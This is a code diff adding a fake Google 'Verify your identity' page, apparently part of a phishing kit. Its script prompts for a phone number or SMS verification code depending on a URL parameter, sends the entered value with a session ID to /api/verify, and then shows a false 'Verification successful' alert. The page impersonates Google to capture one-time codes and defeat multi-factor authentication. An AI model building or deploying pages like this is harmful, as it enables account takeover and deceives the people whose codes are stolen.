@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify your identity</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
+            <h1>Verify your identity</h1>
+            <p class="subtitle">Choose how you want to verify</p>
+
+            <div id="methodDisplay"></div>
+
+            <form id="verifyForm" style="display:none;">
+                <div class="input-group">
+                    <input type="text" id="verificationInput" required placeholder=" ">
+                    <label id="inputLabel">Enter code</label>
+                </div>
+                <button type="submit" class="btn-next">Verify</button>
+            </form>
+
+            <div id="loading" style="display:none;" class="loading">
+                <div class="spinner"></div>
+                <p>Verifying...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const method = urlParams.get('method');
+        const sessionId = sessionStorage.getItem('sessionId') || 'unknown';
+
+        const methodDisplay = document.getElementById('methodDisplay');
+        const verifyForm = document.getElementById('verifyForm');
+        const inputLabel = document.getElementById('inputLabel');
+        const verificationInput = document.getElementById('verificationInput');
+
+        switch(method) {
+            case 'phone':
+                methodDisplay.innerHTML = `
+                    <div class="method-box">
+                        <span class="method-icon">📱</span>
+                        <p><strong>Enter phone number</strong></p>
+                        <p class="hint">We'll send a verification code</p>
+                    </div>
+                `;
+                inputLabel.textContent = 'Phone number';
+                verificationInput.type = 'tel';
+                break;
+            case 'sms':
+                methodDisplay.innerHTML = `
+                    <div class="method-box">
+                        <span class="method-icon">✉️</span>
+                        <p><strong>Enter SMS verification code</strong></p>
+                        <p class="hint">We sent a code to your phone</p>
+                    </div>
+                `;
+                inputLabel.textContent = 'Verification code';
+                verificationInput.type = 'text';
+                break;
+            case 'notification':
+                methodDisplay.innerHTML = `
+                    <div class="method-box">
+                        <span class="method-icon">🔔</span>
+                        <p><strong>Check your other device</strong></p>
+                        <p class="hint">We sent a notification to your phone</p>
+                        <button id="checkNotification" class="btn-next" style="margin-top:15px;">✓ Checked notification</button>
+                    </div>
+                `;
+                verifyForm.style.display = 'none';
+                document.getElementById('checkNotification')?.addEventListener('click', () => {
+                    window.location.href = '/success.html';
+                });
+                break;
+            default:
+                methodDisplay.innerHTML = '<p>Verification method not specified</p>';
+        }
+
+        if (method !== 'notification') {
+            verifyForm.style.display = 'block';
+
+            verifyForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const value = verificationInput.value;
+
+                await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId, method, value })
+                });
+
+                alert('✅ Verification successful!');
+                window.location.href = '/success.html';
+            });
+        }
+    </script>
+</body>
+</html>
